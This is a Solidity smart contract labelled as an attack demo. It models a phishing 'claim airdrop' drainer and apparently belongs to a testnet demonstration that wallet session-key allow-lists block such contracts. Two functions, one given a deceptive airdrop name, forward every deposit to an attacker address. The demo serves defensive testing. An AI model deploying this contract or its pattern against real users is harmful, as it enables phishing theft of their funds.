// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.24;

/// @title Drainer (ATTACK DEMO ONLY)
/// @notice Models a phishing "claim airdrop" contract: it forwards everything it receives to the attacker.
///         QoreConnect accounts never approve it, so the chain refuses calls from a MetaMask session key
///         (target not in the allow-list, and value over the per-transaction limit). Testnet demo only.
contract Drainer {
    address payable public immutable attacker;
    uint256 public totalStolen;

    event Drained(address indexed victim, uint256 amount);

    error TransferFailed();

    constructor(address payable attacker_) {
        attacker = attacker_;
    }

    /// @notice Pretends to "claim an airdrop"; actually forwards msg.value to the attacker.
    function drain() external payable {
        totalStolen += msg.value;
        (bool ok,) = attacker.call{value: msg.value}("");
        if (!ok) revert TransferFailed();
        emit Drained(msg.sender, msg.value);
    }

    /// @notice Same as drain(), with a believable name for the phishing page.
    function claimAirdrop() external payable {
        totalStolen += msg.value;
        (bool ok,) = attacker.call{value: msg.value}("");
        if (!ok) revert TransferFailed();
        emit Drained(msg.sender, msg.value);
    }
}
